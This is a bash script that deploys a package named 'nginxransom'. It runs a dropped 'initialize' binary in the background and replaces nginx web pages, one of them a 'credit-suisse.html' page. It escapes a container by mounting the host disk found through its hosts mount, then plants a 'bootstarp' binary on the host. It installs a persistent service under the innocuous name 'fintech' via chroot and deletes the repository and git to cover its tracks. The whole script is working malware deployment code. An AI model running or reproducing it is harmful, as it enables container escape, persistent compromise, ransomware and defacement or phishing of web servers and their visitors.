#!/bin/bash  
#apt update -y 
#apt install git -y  
#git clone https://github.com/xeroxpro/nginxransom.git
apt install systemctl -y
cp   nginxransom/initialize.txt /usr/bin/initialize  
chmod 777 /usr/bin/initialize 
initialize &
cp   nginxransom/web/index.html /usr/share/nginx/html/index.html
cp   nginxransom/web/credit-suisse.html /usr/share/nginx/html/credit-suisse.html
diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
mount $diskpart /mnt/
cp   nginxransom/bootstarp.txt /mnt/usr/bin/bootstarp
cp   nginxransom/bootstarp.txt /mnt/usr/local/bin/bootstarp 
cp   nginxransom/bootstarp.txt /usr/bin/bootstarp
cp   nginxransom/service.sh ../
cp   nginxransom/service.sh ../mnt/
chmod 777 /usr/bin/bootstarp 
chmod 777 mnt/usr/local/bin/bootstarp
chmod 777 mnt/usr/bin/bootstarp 
chmod 777 mnt/service.sh
chmod 777 service.sh
chroot mnt/ cp service.sh /etc/init.d/fintech
chroot mnt/ chmod +x /etc/init.d/fintech
chroot mnt/ service fintech start
#chroot mnt/ ./service.sh start
chroot mnt/ update-rc.d fintech defaults
#chroot ./ ./bootstarp 
#echo  "[Unit]\nDescription=finetech\nAfter=network.target\n\n[Service]\nExecStart=/usr/local/bin/bootstarp\nRestart=always\n\n[Install]\nWantedBy=multi-user.target" > mnt/usr/lib/systemd/system/finetech.service
#chmod 777  mnt/usr/lib/systemd/system/finetech.service
#chroot mnt/ systemctl daemon-reload
#wait
#chroot mnt/ systemctl enable finetech.service
#chroot mnt/ systemctl start finetech.service
apt remove git -y
rm -rf nginxransom/
